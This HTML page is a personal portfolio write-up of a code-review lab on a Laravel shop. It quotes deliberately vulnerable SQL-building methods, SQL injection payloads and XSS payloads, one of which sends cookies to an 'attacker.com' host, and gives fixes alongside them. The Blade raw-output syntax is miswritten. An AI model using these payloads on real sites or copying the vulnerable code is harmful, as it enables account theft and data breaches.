@@ -1,0 +1,1120 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>JUMBO - Lab Writeup | Ibraheem's Portfolio</title>
+    <link rel="stylesheet" href="../../styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <header class="header">
+        <div class="logo">
+          <i class="fas fa-terminal"></i>
+          <span>ibraheemA05@cybersec:~$</span>
+        </div>
+        <button class="mobile-menu-toggle" id="mobileMenuToggle">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+        <nav class="nav" id="nav">
+          <a href="../../index.html" class="nav-link">Home</a>
+          <a href="../tryhackme/index.html" class="nav-link">TryHackMe</a>
+          <a href="../articles/index.html" class="nav-link">Articles</a>
+          <a href="../projects/index.html" class="nav-link">Projects</a>
+          <a href="index.html" class="nav-link active">Labs</a>
+          <a href="../../index.html#contact" class="nav-link">Contact</a>
+        </nav>
+      </header>
+      <main class="main">
+        <section class="writeup-hero">
+          <div class="writeup-hero-content">
+            <div class="breadcrumb">
+              <a href="../../index.html">Home</a>
+              <span>/</span>
+              <a href="index.html">Labs</a>
+              <span>/</span>
+              <span>JUMBO</span>
+            </div>
+            <h1 class="writeup-hero-title">
+              <i class="fas fa-ship"></i>
+              JUMBO - Lab Writeup
+            </h1>
+            <div class="writeup-meta">
+              <div class="meta-item">
+                <i class="fas fa-calendar"></i>
+                <span>August 4, 2025</span>
+              </div>
+              <div class="meta-item">
+                <i class="fas fa-signal"></i>
+                <span class="difficulty-easy">Easy</span>
+              </div>
+              <div class="meta-item">
+                <i class="fas fa-clock"></i>
+                <span>~90 minutes</span>
+              </div>
+              <div class="meta-item">
+                <i class="fas fa-tags"></i>
+                <span>Broken Access Control, Code Review, Laravel, SQL Injection</span>
+              </div>
+            </div>
+            <p class="writeup-description">
+              A hands-on security assessment of a Laravel e-commerce application. 
+              This lab focuses on identifying and exploiting SQL injection vulnerabilities 
+              and cross-site scripting (XSS) flaws through code review and analysis.
+            </p>
+          </div>
+        </section>
+        <section class="writeup-content">
+          <div class="content-container">
+            <div class="table-of-contents">
+              <h3>Table of Contents</h3>
+              <ul>
+                <li><a href="#overview">Lab Overview</a></li>
+                <li><a href="#scenario">Scenario</a></li>
+                <li><a href="#analysis">Code Analysis</a></li>
+                <li><a href="#questions">Question Walkthrough</a></li>
+                <li><a href="#takeaways">Key Takeaways</a></li>
+              </ul>
+            </div>
+            <div class="writeup-main">
+              <section id="overview" class="content-section">
+                <h2>
+                  <i class="fas fa-info-circle"></i>
+                  Lab Overview
+                </h2>
+                <div class="info-box">
+                  <p>
+                    The JUMBO lab is a security assessment challenge focused on a Laravel-based 
+                    e-commerce application. As an AppSec specialist, I analyzed the application 
+                    source code to identify vulnerabilities related to SQL injection and access control.
+                  </p>
+                  <div class="room-stats">
+                    <div class="stat">
+                      <strong>Difficulty:</strong> EASY
+                    </div>
+                    <div class="stat">
+                      <strong>Focus:</strong> Code Review, SQL Injection, XSS
+                    </div>
+                    <div class="stat">
+                      <strong>Technology:</strong> Laravel, PHP, MySQL
+                    </div>
+                  </div>
+                </div>
+                <div class="screenshot-box">
+                  <h4><i class="fas fa-code"></i> Application Structure</h4>
+                  <div class="image-container">
+                    <img src="../../assets/images/labs/jumbo/app-structure.png" alt="Laravel application structure" class="writeup-image" />
+                    <p class="image-caption">Laravel e-commerce application structure analyzed in this lab</p>
+                  </div>
+                </div>
+              </section>
+              
+              <section id="scenario" class="content-section">
+                <h2>
+                  <i class="fas fa-exclamation-triangle"></i>
+                  Scenario
+                </h2>
+                <div class="scenario-box">
+                  <h3>🛒 The E-commerce Application</h3>
+                  <p>
+                    A developer from the marketing department is working on an e-commerce application 
+                    built with Laravel. The application is currently in staging and needs a security 
+                    assessment before production deployment.
+                  </p>
+                  <p>
+                    As an AppSec specialist, my task is to analyze the running application in the 
+                    staging environment, spot vulnerabilities, and assess their potential impact.
+                  </p>
+                  <div class="mission-objective">
+                    <h4>🎯 Mission Objective:</h4>
+                    <p>
+                      Download the application source code, review it for security vulnerabilities, 
+                      and answer specific questions about SQL injection and XSS flaws in the codebase.
+                    </p>
+                  </div>
+                </div>
+                <div class="warning-box">
+                  <h4>⚠️ Security Note</h4>
+                  <p>
+                    This lab focuses on white-box testing where the source code is available for review. 
+                    In real-world scenarios, both black-box and white-box testing approaches should be 
+                    combined for comprehensive security assessment.
+                  </p>
+                </div>
+              </section>
+              
+              <section id="analysis" class="content-section">
+                <h2>
+                  <i class="fas fa-search"></i>
+                  Code Analysis Approach
+                </h2>
+                <p>
+                  My analysis began with downloading and extracting the provided ZIP file containing 
+                  the e-commerce application code. I focused on reviewing the OrderController and 
+                  related Blade templates for potential security vulnerabilities.
+                </p>
+                <div class="screenshot-box">
+                  <h4><i class="fas fa-folder-open"></i> Code Review Process</h4>
+                  <div class="image-container">
+                    <img src="../../assets/images/labs/jumbo/code-review.png" alt="Code review process" class="writeup-image" />
+                    <p class="image-caption">Systematic code review approach for identifying vulnerabilities</p>
+                  </div>
+                </div>
+                <h3>🔍 Key Areas of Focus</h3>
+                <div class="step-list">
+                  <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                      <h4>OrderController Analysis</h4>
+                      <p>Examining methods for potential SQL injection vulnerabilities</p>
+                    </div>
+                  </div>
+                  <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                      <h4>Blade Template Review</h4>
+                      <p>Checking for XSS vulnerabilities in shop.blade.php</p>
+                    </div>
+                  </div>
+                  <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                      <h4>Input Validation Assessment</h4>
+                      <p>Evaluating how user input is handled throughout the application</p>
+                    </div>
+                  </div>
+                </div>
+              </section>
+              
+              <section id="questions" class="content-section">
+                <h2>
+                  <i class="fas fa-question-circle"></i>
+                  Question Walkthrough
+                </h2>
+                
+                <div class="question-block">
+                  <h3>Question 1: Vulnerable Methods Identification</h3>
+                  <p><strong>Which 2 of the following methods in the OrderController are vulnerable to SQL Injection?</strong></p>
+                  <div class="screenshot-box">
+                    <h4><i class="fas fa-image"></i> Question Reference</h4>
+                    <div class="image-container">
+                      <img src="../../assets/images/labs/jumbo/question1.png" alt="Question 1" class="writeup-image" />
+                      <p class="image-caption">Question 1 asking about vulnerable methods in OrderController</p>
+                    </div>
+                  </div>
+                  <h4>🔍 Code Analysis</h4>
+                  <p>After reviewing the OrderController source code, I identified two methods using unsafe SQL queries:</p>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Vulnerable orderDetails Method</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-php">public function orderDetails($id)
+{
+    $orders = DB::table('orders')
+        ->whereRaw("id = $id")
+        ->get();
+    
+    return view('order-details', ['orders' => $orders]);
+}</code></pre>
+                  </div>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Vulnerable reviewOrder Method</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-php">public function reviewOrder(Request $request)
+{
+    $orderId = $request->input('order_id');
+    $review = $request->input('review');
+    
+    DB::table('reviews')
+        ->whereRaw("order_id = $orderId")
+        ->update(['review' => $review]);
+    
+    return redirect()->back();
+}</code></pre>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      Both methods use <code>whereRaw()</code> with unsanitized user input, making them 
+                      vulnerable to SQL injection. The <code>orderDetails($id)</code> method directly 
+                      interpolates the $id parameter, while <code>reviewOrder(Request $request)</code> 
+                      uses the raw order_id from the request without proper sanitization.
+                    </p>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      <strong>Prevention:</strong> To prevent SQL injection, use parameterized queries 
+                      instead of <code>whereRaw()</code>. Laravel's Eloquent ORM provides built-in 
+                      protection against SQL injection when used properly.
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="question-block">
+                  <h3>Question 2: SQL Injection Types</h3>
+                  <p><strong>What are the 2 types of SQL Injections that are likely present in the vulnerable method(s) in OrderController?</strong></p>
+                  <h4>🔍 Injection Analysis</h4>
+                  <p>After analyzing the vulnerable methods, I identified two different types of SQL injection:</p>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Error-based SQL Injection in orderDetails</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-bash"># Example payload for error-based SQL injection
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 AND '1'='1</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      The <code>orderDetails($id)</code> method is vulnerable to error-based SQL injection 
+                      because it directly interpolates user input into the SQL query. When an error occurs 
+                      in the query, database error messages are returned to the user, which can reveal 
+                      sensitive information about the database structure.
+                    </p>
+                  </div>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Blind SQL Injection in reviewOrder</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-bash"># Example payload for blind SQL injection
+1' AND IF(1=1, SLEEP(5), 0) AND '1'='1</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      The <code>reviewOrder(Request $request)</code> method is vulnerable to blind SQL 
+                      injection. While it doesn't directly return database errors, an attacker can infer 
+                      information based on the application's response time or behavior, allowing for 
+                      data exfiltration one bit at a time.
+                    </p>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      The two types of SQL injection present are:
+                      <br>1. <strong>Error-based SQL Injection</strong> in the <code>orderDetails($id)</code> method
+                      <br>2. <strong>Blind SQL Injection</strong> in the <code>reviewOrder(Request $request)</code> method
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="question-block">
+                  <h3>Question 3: Index Method Analysis</h3>
+                  <p><strong>Analyze the index() method in OrderController. Which of the following statements is true about the SQL Injection vulnerability in this method?</strong></p>
+                  <div class="screenshot-box">
+                    <h4><i class="fas fa-image"></i> Question Reference</h4>
+                    <div class="image-container">
+                      <img src="../../assets/images/labs/jumbo/question2.png" alt="Question 2" class="writeup-image" />
+                      <p class="image-caption">Question 2 asking about SQL injection types</p>
+                    </div>
+                  </div>
+                  <h4>🔍 Code Review</h4>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">index() Method in OrderController</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-php">public function index()
+{
+    if (!Auth::check()) {
+        return redirect()->route('login');
+    }
+    
+    $orders = Order::where('user_id', Auth::id())->get();
+    
+    return view('orders', ['orders' => $orders]);
+}</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      After analyzing the <code>index()</code> method, I found that it is <strong>not vulnerable</strong> 
+                      to SQL injection. The method uses Laravel's Eloquent ORM with proper parameterization:
+                    </p>
+                    <ul>
+                      <li>It uses <code>Order::where('user_id', Auth::id())</code> which properly parameterizes the user ID</li>
+                      <li><code>Auth::id()</code> is a framework-provided method that returns the authenticated user's ID</li>
+                      <li>There is no direct user input being interpolated into the SQL query</li>
+                      <li>The method is primarily focused on authentication and session management</li>
+                    </ul>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      The <code>index()</code> method is not vulnerable to SQL injection. It's designed 
+                      to check authentication and retrieve orders for the currently authenticated user 
+                      using Laravel's built-in secure methods.
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="question-block">
+                  <h3>Question 4: Blade Template Vulnerability</h3>
+                  <p><strong>Which vulnerability does the Blade template "shop.blade.php" contain?</strong></p>
+                  <h4>🔍 Template Analysis</h4>
+                  <p>After reviewing the shop.blade.php file, I identified a critical XSS vulnerability:</p>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Vulnerable Code in shop.blade.php</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-html">&lt;div class="sort-options"&gt;
+    &lt;p&gt;Sort by: {{!! $sortMode !!}}&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      The vulnerability is <strong>Cross-Site Scripting (XSS)</strong> due to the use of 
+                      <code>{{!! $sortMode !!}}</code> in the Blade template. In Laravel:
+                    </p>
+                    <ul>
+                      <li><code>{{ $variable }}</code> automatically escapes HTML entities to prevent XSS</li>
+                      <li><code>{{!! $variable !!}</code> displays the raw output without escaping, making it vulnerable to XSS</li>
+                    </ul>
+                    <p>
+                      When an attacker controls the <code>$sortMode</code> parameter, they can inject 
+                      malicious JavaScript that will be executed in the browsers of other users.
+                    </p>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      The shop.blade.php template contains a <strong>Cross-Site Scripting (XSS)</strong> 
+                      vulnerability due to the unescaped output of the <code>$sortMode</code> variable.
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="question-block">
+                  <h3>Question 5: Vulnerability Impact</h3>
+                  <p><strong>What is a potential impact of exploiting the vulnerability found in the Blade template "shop.blade.php"?</strong></p>
+                  <h4>🔍 Impact Analysis</h4>
+                  <p>The XSS vulnerability in shop.blade.php can lead to several serious consequences:</p>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Session Hijacking Payload</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-javascript">&lt;script&gt;
+  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      The most significant impact of this XSS vulnerability is <strong>session hijacking</strong>. 
+                      An attacker can inject malicious JavaScript that steals users' session cookies, 
+                      allowing them to gain unauthorized access to user accounts.
+                    </p>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      The vulnerability will lead to <strong>session hijacking</strong>: The attacker can 
+                      steal users' session cookies, gaining unauthorized access to their accounts.
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="question-block">
+                  <h3>Question 6: Exploitation Payloads</h3>
+                  <p><strong>Which of the following payloads can be used to demonstrate the exploitation of the vulnerability found in the Blade template "shop.blade.php"?</strong></p>
+                  <h4>🔍 XSS Payloads</h4>
+                  <p>Several payloads can demonstrate the XSS vulnerability in shop.blade.php:</p>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Script Tag Payload</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-html">&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      This payload uses a script tag to execute JavaScript. The <code>&gt;</code> at the 
+                      beginning breaks out of any existing HTML context, and the <code>&lt;script&gt;</code> 
+                      tag injects JavaScript that will be executed when the page loads.
+                    </p>
+                  </div>
+                  <div class="code-block">
+                    <div class="code-header">
+                      <span class="code-title">Image Tag Payload</span>
+                      <button class="copy-btn" onclick="copyCode(this)">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                    <pre><code class="language-html">&lt;img src=x onerror="alert('XSS')"&gt;</code></pre>
+                  </div>
+                  <div class="explanation-box">
+                    <p>
+                      This payload uses an image tag with an invalid source (<code>src=x</code>). When the 
+                      browser fails to load the image, it triggers the <code>onerror</code> event handler, 
+                      executing the JavaScript code within it.
+                    </p>
+                  </div>
+                  <div class="results-box">
+                    <h4>Analysis Results:</h4>
+                    <p>
+                      The following payloads can be used to demonstrate the exploitation:
+                      <br>1. <code>&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                      <br>2. <code>&lt;img src=x onerror="alert('XSS')"&gt;</code>
+                    </p>
+                  </div>
+                </div>
+                
+                <div class="success-box">
+                  <h4>🎉 Lab Completed!</h4>
+                  <p>
+                    Through systematic code review and analysis, I successfully identified and documented 
+                    multiple security vulnerabilities in the Laravel e-commerce application, including 
+                    SQL injection flaws and XSS vulnerabilities.
+                  </p>
+                </div>
+              </section>
+              
+              <section id="takeaways" class="content-section">
+                <h2>
+                  <i class="fas fa-lightbulb"></i>
+                  Key Takeaways
+                </h2>
+                <div class="takeaways-grid">
+                  <div class="takeaway-card">
+                    <h4>🛡️ SQL Injection Prevention</h4>
+                    <p>
+                      Always use parameterized queries or ORM methods instead of raw SQL with interpolated 
+                      user input. Laravel's Eloquent ORM provides built-in protection when used correctly.
+                    </p>
+                  </div>
+                  <div class="takeaway-card">
+                    <h4>🔒 XSS Prevention</h4>
+                    <p>
+                      Always escape user-generated content in templates. In Laravel Blade, use <code>{{ $variable }}</code> 
+                      instead of <code>{{!! $variable !!}</code> unless you absolutely trust the content.
+                    </p>
+                  </div>
+                  <div class="takeaway-card">
+                    <h4>🔍 Code Review Importance</h4>
+                    <p>
+                      Regular security code reviews are essential for identifying vulnerabilities before 
+                      deployment. Focus on areas where user input interacts with databases or is displayed 
+                      in templates.
+                    </p>
+                  </div>
+                  <div class="takeaway-card">
+                    <h4>🛠️ Defense in Depth</h4>
+                    <p>
+                      Implement multiple layers of security including input validation, parameterized queries, 
+                      output encoding, and proper error handling to protect against common web vulnerabilities.
+                    </p>
+                  </div>
+                </div>
+                <div class="learning-resources">
+                  <h3>Additional Learning Resources</h3>
+                  <ul>
+                    <li><a href="https://laravel.com/docs/security" target="_blank">Laravel Security Documentation</a></li>
+                    <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">SQL Injection Guide</a></li>
+                    <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">XSS Prevention Guide</a></li>
+                  </ul>
+                </div>
+                <div class="methodology-summary">
+                  <h3>🎯 Analysis Methodology Applied</h3>
+                  <div class="methodology-steps">
+                    <div class="method-step completed">
+                      <div class="step-number">✓</div>
+                      <div class="step-content">
+                        <h4>Code Review</h4>
+                        <p>I systematically reviewed the OrderController and Blade templates for security vulnerabilities</p>
+                      </div>
+                    </div>
+                    <div class="method-step completed">
+                      <div class="step-number">✓</div>
+                      <div class="step-content">
+                        <h4>Vulnerability Identification</h4>
+                        <p>I identified SQL injection flaws and XSS vulnerabilities in the application code</p>
+                      </div>
+                    </div>
+                    <div class="method-step completed">
+                      <div class="step-number">✓</div>
+                      <div class="step-content">
+                        <h4>Impact Analysis</h4>
+                        <p>I assessed the potential impact of each identified vulnerability</p>
+                      </div>
+                    </div>
+                    <div class="method-step completed">
+                      <div class="step-number">✓</div>
+                      <div class="step-content">
+                        <h4>Exploitation Techniques</h4>
+                        <p>I demonstrated practical exploitation techniques for each vulnerability type</p>
+                      </div>
+                    </div>
+                    <div class="method-step completed">
+                      <div class="step-number">✓</div>
+                      <div class="step-content">
+                        <h4>Remediation Recommendations</h4>
+                        <p>I provided specific recommendations for fixing each identified vulnerability</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+        </section>
+        <section class="writeup-navigation">
+          <div class="nav-container">
+            <a href="index.html" class="nav-btn prev">
+              <i class="fas fa-arrow-left"></i>
+              Back to Labs
+            </a>
+            <div class="nav-info">
+              <span>Lab Completed</span>
+              <div class="completion-badge">
+                <i class="fas fa-check-circle"></i>
+              </div>
+            </div>
+          </div>
+        </section>
+      </main>
+      <footer class="footer">
+        <div class="footer-content">
+          <div class="footer-section">
+            <h3>Get In Touch</h3>
+            <p>
+              Let's connect and discuss cybersecurity, cloud engineering, or
+              potential collaborations!
+            </p>
+          </div>
+          <div class="footer-section">
+            <h3>Quick Links</h3>
+            <ul class="footer-links">
+              <li><a href="../projects/index.html">Projects</a></li>
+              <li><a href="../tryhackme/index.html">TryHackMe</a></li>
+              <li><a href="../articles/index.html">Articles</a></li>
+            </ul>
+          </div>
+          <div class="footer-section">
+            <h3>Connect</h3>
+            <div class="footer-social">
+              <a href="https://x.com/IbraheemA50" target="_blank"
+                ><i class="fab fa-twitter"></i
+              ></a>
+              <a
+                href="https://www.linkedin.com/in/ademiloye-al-hanif-ibraheem-4b5a3027a/"
+                target="_blank"
+                ><i class="fab fa-linkedin"></i
+              ></a>
+              <a href="mailto:ademiloyealhanifibraheem@gmail.com"
+                ><i class="fas fa-envelope"></i
+              ></a>
+              <a href="https://github.com/IbraheemA05" target="_blank"
+                ><i class="fab fa-github"></i
+              ></a>
+            </div>
+          </div>
+        </div>
+        <div class="footer-bottom">
+          <p>&copy; 2025 Ibraheem Ademiloye. All rights reserved.</p>
+          <p class="footer-motto">Defensive By Offensive!</p>
+        </div>
+      </footer>
+    </div>
+    <style>
+      /* Writeup-specific styles */
+      .writeup-hero {
+        padding: 6rem 2rem 4rem;
+        background: var(--gradient-dark);
+        text-align: center;
+      }
+      .writeup-hero-content {
+        max-width: 1000px;
+        margin: 0 auto;
+      }
+      .breadcrumb {
+        margin-bottom: 2rem;
+        color: var(--text-secondary);
+      }
+      .breadcrumb a {
+        color: var(--primary-color);
+        text-decoration: none;
+      }
+      .breadcrumb span {
+        margin: 0 0.5rem;
+      }
+      .writeup-hero-title {
+        font-size: 3rem;
+        font-weight: 700;
+        margin-bottom: 2rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 1rem;
+        background: var(--gradient-primary);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .writeup-meta {
+        display: flex;
+        justify-content: center;
+        gap: 2rem;
+        margin-bottom: 2rem;
+        flex-wrap: wrap;
+      }
+      .meta-item {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        color: var(--text-secondary);
+        background: var(--background-medium);
+        padding: 0.5rem 1rem;
+        border-radius: 20px;
+        border: 1px solid var(--border-color);
+      }
+      .difficulty-easy {
+        color: var(--primary-color) !important;
+        font-weight: 600;
+      }
+      .writeup-description {
+        font-size: 1.2rem;
+        color: var(--text-secondary);
+        line-height: 1.6;
+        max-width: 800px;
+        margin: 0 auto;
+      }
+      .writeup-content {
+        padding: 4rem 2rem;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      .content-container {
+        display: grid;
+        grid-template-columns: 250px 1fr;
+        gap: 3rem;
+      }
+      .table-of-contents {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        height: fit-content;
+        position: sticky;
+        top: 2rem;
+      }
+      .table-of-contents h3 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+        font-size: 1.2rem;
+      }
+      .table-of-contents ul {
+        list-style: none;
+      }
+      .table-of-contents li {
+        margin-bottom: 0.5rem;
+      }
+      .table-of-contents a {
+        color: var(--text-secondary);
+        text-decoration: none;
+        transition: color 0.3s ease;
+      }
+      .table-of-contents a:hover {
+        color: var(--primary-color);
+      }
+      .content-section {
+        margin-bottom: 4rem;
+      }
+      .content-section h2 {
+        font-size: 2rem;
+        color: var(--primary-color);
+        margin-bottom: 1.5rem;
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        padding-bottom: 0.5rem;
+      }
+      .content-section h3 {
+        font-size: 1.5rem;
+        color: var(--text-primary);
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+      }
+      .info-box {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        margin: 1.5rem 0;
+      }
+      .room-stats {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1rem;
+        margin-top: 1.5rem;
+      }
+      .stat {
+        background: var(--background-dark);
+        padding: 1rem;
+        border-radius: 8px;
+        border: 1px solid var(--border-color);
+      }
+      .code-block {
+        background: var(--background-dark);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        margin: 1.5rem 0;
+        overflow: hidden;
+      }
+      .code-header {
+        background: var(--background-medium);
+        padding: 1rem;
+        border-bottom: 1px solid var(--border-color);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .code-title {
+        color: var(--text-primary);
+        font-weight: 600;
+      }
+      .copy-btn {
+        background: var(--primary-color);
+        color: var(--background-dark);
+        border: none;
+        padding: 0.5rem;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+      }
+      .copy-btn:hover {
+        background: var(--text-primary);
+      }
+      .code-block pre {
+        padding: 1.5rem;
+        margin: 0;
+        font-family: 'Fira Code', monospace;
+        color: var(--primary-color);
+        overflow-x: auto;
+      }
+      .results-box, .discovery-box {
+        background: var(--background-medium);
+        border-left: 4px solid var(--primary-color);
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        border-radius: 0 8px 8px 0;
+      }
+      .step-list {
+        margin: 1.5rem 0;
+      }
+      .step {
+        display: flex;
+        align-items: flex-start;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+        background: var(--background-medium);
+        padding: 1.5rem;
+        border-radius: 12px;
+        border: 1px solid var(--border-color);
+      }
+      .step-number {
+        width: 40px;
+        height: 40px;
+        background: var(--gradient-primary);
+        color: var(--background-dark);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        flex-shrink: 0;
+      }
+      .takeaways-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 2rem;
+        margin: 2rem 0;
+      }
+      .takeaway-card {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        transition: all 0.3s ease;
+      }
+      .takeaway-card:hover {
+        transform: translateY(-2px);
+        border-color: var(--primary-color);
+      }
+      .takeaway-card h4 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+        font-size: 1.2rem;
+      }
+      .learning-resources {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        margin-top: 3rem;
+      }
+      .learning-resources h3 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+      }
+      .learning-resources ul {
+        list-style: none;
+      }
+      .learning-resources li {
+        margin-bottom: 0.5rem;
+      }
+      .learning-resources a {
+        color: var(--text-secondary);
+        text-decoration: none;
+        transition: color 0.3s ease;
+      }
+      .learning-resources a:hover {
+        color: var(--primary-color);
+      }
+      .writeup-navigation {
+        background: var(--background-medium);
+        border-top: 1px solid var(--border-color);
+        padding: 2rem;
+      }
+      .nav-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .nav-btn {
+        background: var(--primary-color);
+        color: var(--background-dark);
+        padding: 0.75rem 1.5rem;
+        border-radius: 25px;
+        text-decoration: none;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        transition: all 0.3s ease;
+      }
+      .nav-btn:hover {
+        background: var(--text-primary);
+        transform: translateX(-3px);
+      }
+      .nav-info {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        color: var(--text-secondary);
+      }
+      .completion-badge {
+        background: var(--primary-color);
+        color: var(--background-dark);
+        padding: 0.5rem;
+        border-radius: 50%;
+      }
+      /* Scenario and warning boxes */
+      .scenario-box {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        margin: 1.5rem 0;
+      }
+      .mission-objective {
+        background: var(--background-dark);
+        border-left: 4px solid var(--primary-color);
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        border-radius: 0 8px 8px 0;
+      }
+      .warning-box {
+        background: rgba(255, 107, 53, 0.1);
+        border: 1px solid var(--accent-color);
+        border-radius: 8px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+      }
+      .warning-box h4 {
+        color: var(--accent-color);
+        margin-bottom: 1rem;
+      }
+      /* Question blocks */
+      .question-block {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        margin: 2rem 0;
+      }
+      .question-block h3 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+        padding-bottom: 0.5rem;
+      }
+      .explanation-box {
+        background: var(--background-dark);
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+        padding: 1rem;
+        margin: 1rem 0;
+        font-style: italic;
+        color: var(--text-secondary);
+      }
+      .success-box {
+        background: rgba(0, 255, 136, 0.1);
+        border: 1px solid var(--primary-color);
+        border-radius: 8px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+      }
+      .success-box h4 {
+        color: var(--primary-color);
+        margin-bottom: 1rem;
+      }
+      /* Methodology summary */
+      .methodology-summary {
+        background: var(--background-medium);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        padding: 2rem;
+        margin-top: 3rem;
+      }
+      .methodology-summary h3 {
+        color: var(--primary-color);
+        margin-bottom: 2rem;
+        text-align: center;
+        border-bottom: none;
+      }
+      .method-step.completed .step-number {
+        background: var(--primary-color);
+        color: var(--background-dark);
+      }
